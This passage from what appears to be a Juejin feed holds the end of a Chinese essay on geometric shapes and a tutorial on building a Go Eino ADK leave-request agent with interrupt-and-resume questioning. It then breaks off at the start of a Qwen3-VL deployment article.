<li><strong>粗/细箭头</strong>：表示强度、优先级或数据流大小</li>
</ul>
<h3 data-id="heading-23">设计原则</h3>
<ul>
<li><strong>清晰性</strong>：方向必须一目了然</li>
<li><strong>比例协调</strong>：箭头头不宜过大或过小</li>
<li><strong>上下文适配</strong>：在UI设计、交通标志、数学符号中风格各异</li>
</ul>
<h3 data-id="heading-24">与其他图形的联系</h3>
<ul>
<li>箭头头部常采用<strong>三角形</strong>，因其尖锐指向性强。</li>
<li>在矢量场中，箭头长度代表<strong>大小</strong>，方向代表<strong>矢量方向</strong>。</li>
<li>在时间线或流程图中，箭头连接<strong>圆形</strong>（节点）或<strong>椭圆</strong>（状态），形成信息网络。</li>
</ul>
<p>箭头标志着从<strong>静态几何</strong>向<strong>动态语义</strong>的跃迁——它不再仅仅描述“是什么”，而是说明“往哪里去”。</p>
<hr/>
<h2 data-id="heading-25">🔗 图形演进的逻辑脉络</h2>
<p>从 📐 到 🧭，这一序列隐含着人类认知与技术发展的深层逻辑：</p>
<ol>
<li><strong>构建基础</strong>（三角形）：最稳定的结构单元，支撑物理世界。</li>
<li><strong>扩展形态</strong>（梯形）：引入不对称与实用性，适应现实需求。</li>
<li><strong>引入曲线</strong>（扇形）：从直线到弧线，开启连续性思维。</li>
<li><strong>追求完美对称</strong>（圆形）：理想化的极限形式，体现自然法则。</li>
<li><strong>打破对称，拥抱真实</strong>（椭圆）：描述更复杂的自然现象（如轨道）。</li>
<li><strong>超越形状，传达意图</strong>（箭头）：图形成为信息载体，服务于沟通与控制。</li>
</ol>
<p>这一路径不仅是几何复杂度的提升，更是从<strong>存在</strong>（being）到<strong>变化</strong>（becoming）的哲学演进。</p>
<hr/>
<h2 data-id="heading-26">💎 结语</h2>
<p>无论是用于计算桥梁承重的三角形，还是指示网页“返回顶部”的小小箭头，这些图形早已融入人类文明的肌理。它们既是数学语言的字母，也是工程蓝图的像素，更是视觉传达的词汇。理解它们的定义、性质与关联，不仅有助于学术研究，更能提升我们在数字时代解读世界的能力。</p>
<p>正如古希腊人用圆规与直尺探索宇宙秩序，今天的我们，依然在这些看似简单的图形中，寻找结构、美感与真理的统一。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go Eino使用ADK开发agent]]></title>    <link>https://juejin.cn/post/7595142737514479643</link>    <guid>https://juejin.cn/post/7595142737514479643</guid>    <pubDate>2026-01-15T05:59:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142737514479643" data-draft-id="7595115707161804841" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go Eino使用ADK开发agent"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T05:59:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户3075009303793"/> <meta itemprop="url" content="https://juejin.cn/user/4453485090705453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go Eino使用ADK开发agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4453485090705453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户3075009303793
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T05:59:43.000Z" title="Thu Jan 15 2026 05:59:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 data-id="heading-0">开发一个简单的帮助请假的agent，用户通过输入请假信息，agent自动完成请假信息补充，发起请假流程</h5>
<p>1、安装依赖</p>
<pre><code class="hljs language-shell" lang="shell">go get -u github.com/cloudwego/eino@latest
go get -u github.com/cloudwego/eino-ext/components/model/openai@late
</code></pre>
<p>2、新建一个循环agent，用于判断用户输入的请假信息是否完整，如果不完整，询问用户输入相关的信息,核心在于创建一个工具，通过工具中断agent，获取问题用户的回答</p>
<pre><code class="hljs language-go" lang="go">inferTool, err := utils.InferTool(
    <span class="hljs-string">"askQuestions"</span>,
    <span class="hljs-string">"询问用户补充信息"</span>,
    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input InferToolInput)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
       interrupted, _, storedState := compose.GetInterruptState[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, input)
       }
       flow, data, t := compose.GetResumeContext[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !flow {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, storedState)
       }
       fmt.Println(<span class="hljs-string">"###"</span>, t)
       <span class="hljs-keyword">if</span> !data || t == <span class="hljs-string">""</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, fmt.Errorf(<span class="hljs-string">"tool resumed without a user answer"</span>)
       }

       <span class="hljs-keyword">return</span> t, <span class="hljs-literal">nil</span>
    })
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
    <span class="hljs-built_in">panic</span>(err)
}
</code></pre>
<pre><code class="hljs language-go" lang="go">analysisAgent, _ := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveAnalysisAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"分析缺少请假信息"</span>,
       Instruction: <span class="hljs-string">`你是一个请假流程信息分析专家，根据提供的请假信息，分析以下请假关键信息
1、请假的开始和结束时间
2、请假的类型
3、请假的原因
如果请假的信息已经完整，请输入"EXIT:请假信息已完整" 来结束请假信息补充流程
`</span>,
    })

    askAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"completeLeaveInfo"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"根据分析结果询问用户补充请假信息"</span>,
       Instruction: <span class="hljs-string">`根据前面的信息补充问题，使用askQuestions工具，补充请假信息`</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                inferTool,
             },
          },
       },
    })

    exitAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"exitController"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"控制优化循环的退出"</span>,
       Instruction: <span class="hljs-string">`检查前面的分析结果，如果请假流程信息分析专家认为请假信息已经完整（包含"EXIT"关键词），
则输出 "TERMINATE" 并生成退出动作来结束循环。否则继续下一轮优化。`</span>,
    })

    agent, err := adk.NewLoopAgent(context.Background(), &amp;adk.LoopAgentConfig{
       Name:        <span class="hljs-string">"leaveLoop"</span>,
       Description: <span class="hljs-string">"请假信息补充循环：分析缺少请假信息-&gt;询问用户补充请假信息-&gt;检查退出条件"</span>,
       SubAgents: []adk.Agent{
          analysisAgent,
          askAgent,
          exitAgent,
       },
       MaxIterations: <span class="hljs-number">5</span>,
    })

    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
       <span class="hljs-built_in">panic</span>(err)
    }

    leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"发起请假流程"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
       log.Println(<span class="hljs-string">"发起请假入参："</span>, input)
       <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
    })

    modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"发起请假流程"</span>,
       Instruction: <span class="hljs-string">"根据前面的请假信息，使用leaveApproveTool发起请假流程"</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                leaveApproveTool,
             },
          },
       },
    })
</code></pre>
<p>3、创建一个请假流程发起agent，请假信息补充完成之后，发起请假流程</p>
<pre><code class="hljs language-go" lang="go">leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"发起请假流程"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
    log.Println(<span class="hljs-string">"发起请假入参："</span>, input)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
})

modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
    Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
    Model:       chatModel,
    Description: <span class="hljs-string">"发起请假流程"</span>,
    Instruction: <span class="hljs-string">"根据前面的请假信息，使用leaveApproveTool发起请假流程"</span>,
    ToolsConfig: adk.ToolsConfig{
       ToolsNodeConfig: compose.ToolsNodeConfig{
          Tools: []tool.BaseTool{
             leaveApproveTool,
          },
       },
    },
})
</code></pre>
<p>4、创建顺序流将整个流程串联起来，运行同时输入我们的信息<code>帮我从今天起请两天假</code>,查看打印agent的思考过程以及结果</p>
<pre><code class="hljs language-go" lang="go">sequentialAgent, err := adk.NewSequentialAgent(context.Background(), &amp;adk.SequentialAgentConfig{
       Name:        <span class="hljs-string">"leaveSequentialAgent"</span>,
       Description: <span class="hljs-string">"请假工作流"</span>,
       SubAgents: []adk.Agent{
          agent,
          modelAgent,
       },
    })

    runner := adk.NewRunner(context.Background(), adk.RunnerConfig{
       Agent:           sequentialAgent,
       CheckPointStore: store.NewInMemoryStore(),
       EnableStreaming: <span class="hljs-literal">true</span>,
    })

    iter := runner.Query(context.Background(), <span class="hljs-string">"帮我从今天起请两天假"</span>, adk.WithCheckPointID(<span class="hljs-string">"deep-analysis-1"</span>))
    <span class="hljs-keyword">for</span> {
       lastEvent, interrupted := processEvents(iter)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">break</span>
       }

       interruptCtx := lastEvent.Action.Interrupted.InterruptContexts[<span class="hljs-number">0</span>]
       interruptID := interruptCtx.ID
       fmt.Println(interruptCtx.Info.(InferToolInput).Question)
       fmt.Println(<span class="hljs-string">"输入你的答案"</span>)
       <span class="hljs-keyword">var</span> answer <span class="hljs-type">string</span>
       n, err := fmt.Scanln(&amp;answer)
       <span class="hljs-keyword">if</span> n != <span class="hljs-number">1</span> || err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }
       iter, err = runner.ResumeWithParams(context.Background(), <span class="hljs-string">"deep-analysis-1"</span>, &amp;adk.ResumeParams{
          Targets: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any{
             interruptID: answer,
          },
       })
       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }

    }

}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processEvents</span><span class="hljs-params">(iter *adk.AsyncIterator[*adk.AgentEvent])</span></span> (*adk.AgentEvent, <span class="hljs-type">bool</span>) {
    <span class="hljs-keyword">var</span> lastEvent *adk.AgentEvent
    <span class="hljs-keyword">for</span> {
       event, ok := iter.Next()
       <span class="hljs-keyword">if</span> !ok {
          <span class="hljs-keyword">break</span>
       }
       <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
          log.Fatal(event.Err)
       }

       PrintContent(event)
       lastEvent = event
    }

    <span class="hljs-keyword">if</span> lastEvent == <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>
    }
    <span class="hljs-keyword">if</span> lastEvent.Action != <span class="hljs-literal">nil</span> &amp;&amp; lastEvent.Action.Interrupted != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">true</span>
    }
    <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">false</span>
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintContent</span><span class="hljs-params">(event *adk.AgentEvent)</span></span> {
    <span class="hljs-keyword">if</span> event.Output != <span class="hljs-literal">nil</span> &amp;&amp; event.Output.MessageOutput != <span class="hljs-literal">nil</span> {
       output := event.Output.MessageOutput
       <span class="hljs-keyword">if</span> output.IsStreaming {
          stream := output.MessageStream
          <span class="hljs-keyword">if</span> stream != <span class="hljs-literal">nil</span> {

             <span class="hljs-keyword">for</span> {
                chunk, err := stream.Recv()
                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
                   <span class="hljs-keyword">if</span> err == io.EOF {
                      <span class="hljs-keyword">break</span>
                   }
                   fmt.Printf(<span class="hljs-string">"error: %v"</span>, err)
                   <span class="hljs-keyword">return</span>
                }
                <span class="hljs-keyword">if</span> chunk.ReasoningContent != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.ReasoningContent)
                }
                <span class="hljs-keyword">if</span> chunk.Content != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.Content)
                }

             }

          }

       } <span class="hljs-keyword">else</span> {
          message := output.Message
          <span class="hljs-keyword">if</span> message != <span class="hljs-literal">nil</span> {
             <span class="hljs-keyword">if</span> message.Content != <span class="hljs-string">""</span> {
                log.Print(message)
             }

             <span class="hljs-keyword">if</span> message.ReasoningContent != <span class="hljs-string">""</span> {
                fmt.Print(message.ReasoningContent)
             }

          }
       }

    }

    <span class="hljs-keyword">if</span> event.Action != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">if</span> event.Action.TransferToAgent != <span class="hljs-literal">nil</span> {
          fmt.Printf(<span class="hljs-string">"\naction: transfer to %v"</span>, event.Action.TransferToAgent.DestAgentName)
       }

       <span class="hljs-keyword">if</span> event.Action.Interrupted != <span class="hljs-literal">nil</span> {
          <span class="hljs-keyword">for</span> _, ic := <span class="hljs-keyword">range</span> event.Action.Interrupted.InterruptContexts {
             str, ok := ic.Info.(fmt.Stringer)
             <span class="hljs-keyword">if</span> ok {
                fmt.Printf(<span class="hljs-string">"\n%s"</span>, str.String())
             } <span class="hljs-keyword">else</span> {
                fmt.Printf(<span class="hljs-string">"\n%v"</span>, ic.Info)
             }
          }
       }
       <span class="hljs-keyword">if</span> event.Action.Exit {
          fmt.Printf(<span class="hljs-string">"\naction: exit"</span>)
       }
    }

    <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
       fmt.Printf(<span class="hljs-string">"\nerror: %v"</span>, event.Err)
    }

}

<span class="hljs-keyword">type</span> InferToolInput <span class="hljs-keyword">struct</span> {
    Question <span class="hljs-type">string</span> <span class="hljs-string">`json:"question" jsonschema:"required;description=你需要询问的问题"`</span>
}

<span class="hljs-keyword">type</span> LeaveInfo <span class="hljs-keyword">struct</span> {
    StartDate   <span class="hljs-type">string</span> <span class="hljs-string">`json:"startDate" jsonschema:"required;description=请假开始时间"`</span>
    EndDate     <span class="hljs-type">string</span> <span class="hljs-string">`json:"endDate" jsonschema:"required;description=请假结束时间"`</span>
    LeaveType   <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveType" jsonschema:"required;description=请假类型"`</span>
    LeaveReason <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveReason" jsonschema:"required;description=请假原因"`</span>
}
</code></pre>
<p>5、查看结果</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/467ca95f7c1347a3ab9220dc1ba6869a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=SLQ5xROdydcj%2FD9gQ39IGsHIims%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/987869c9f6864c6d8e5b8651f6a0d18e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=cpAhap8pGZpzce6gXQHWx8WXDOM%3D" alt="image.png" loading="lazy"/></p>
<p>总结：整体体验不错，agent的中断和恢复，可以灵活的完成各种场景</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程]]></title>    <link>https://juejin.cn/post/7595157651619987482</link>    <guid>https://juejin.cn/post/7595157651619987482</guid>    <pubDate>2026-01-15T06:22:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595157651619987482" data-draft-id="7595108457496199183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程"/> <meta itemprop="keywords" content="算法"/> <meta itemprop="datePublished" content="2026-01-15T06:22:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FastMoMO"/> <meta itemprop="url" content="https://juejin.cn/user/854760647561804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/854760647561804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FastMoMO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:22:10.000Z" title="Thu Jan 15 2026 06:22:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 